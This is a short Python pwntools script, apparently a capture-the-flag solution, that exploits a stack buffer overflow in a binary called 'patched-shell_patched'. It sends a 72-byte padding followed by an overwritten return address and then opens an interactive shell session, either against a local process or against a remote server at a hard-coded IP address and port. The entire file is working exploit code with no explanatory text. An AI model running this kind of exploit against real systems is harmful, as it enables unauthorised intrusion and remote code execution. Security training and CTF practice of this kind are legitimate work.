#!/usr/bin/env python3

from pwn import *

exe = ELF("./patched-shell_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.134.173.142", 5000)

    return r


def main():
    r = conn()

    r.sendline(b"a"*64 + b"b"*8 + p64(0x40113a))

    r.interactive()


if __name__ == "__main__":
    main()
